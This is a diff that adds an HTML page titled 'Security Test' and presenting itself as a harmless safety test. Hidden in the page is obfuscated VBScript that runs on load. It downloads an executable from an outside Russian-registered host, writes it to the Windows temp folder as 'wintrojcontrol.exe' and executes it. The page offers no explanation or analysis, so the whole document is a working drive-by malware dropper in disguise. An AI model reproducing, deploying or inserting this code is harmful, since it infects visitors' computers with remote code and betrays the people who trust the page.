@@ -1,0 +1,34 @@
+<html>
+<meta http-equiv="x-ua-compatible" content="IE=10">
+<body>
+<script type="text/vbscript">
+Function RYMtrRoI(wTuNEmfz)
+Dim Nyyyghue, stgTtCmV
+For Nyyyghue = 1 To LenB(wTuNEmfz)
+stgTtCmV = stgTtCmV & Chr(AscB(MidB(wTuNEmfz, Nyyyghue, 1)))
+Next
+RYMtrRoI = stgTtCmV
+End Function
+Sub XpOoGXeN(CkvJTsVF, hgdegNNx)
+Dim awUPWUca: Set awUPWUca = CreateObject("MSXML2.ServerXMLHTTP")
+Dim FrCkjpTS: FrCkjpTS = "GET"
+awUPWUca.Open FrCkjpTS, CkvJTsVF, False
+awUPWUca.Send
+Dim knkEwKLK, QiRZJfDB
+Set QiRZJfDB = CreateObject("Scripting.FileSystemObject").OpenTextFile(hgdegNNx, 2, True)
+QiRZJfDB.WriteLine (RYMtrRoI(awUPWUca.ResponseBody))
+QiRZJfDB.Close()
+Set awUPWUca = Nothing
+Set QiRZJfDB = Nothing
+End Sub
+Dim IzIKAmSf: IzIKAmSf = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\wintrojcontrol.exe"
+Dim ouqfNHJX: ouqfNHJX = "http://u23366zlm.ha002.t.justns.ru/1.exe"
+XpOoGXeN ouqfNHJX, IzIKAmSf
+CreateObject("WScript.Shell").Run Chr(34) & IzIKAmSf & Chr(34)
+</script>
+<center>
+<h1>Security Test</h1>
+This is a safety test!
+</center>
+</body>
+</html>
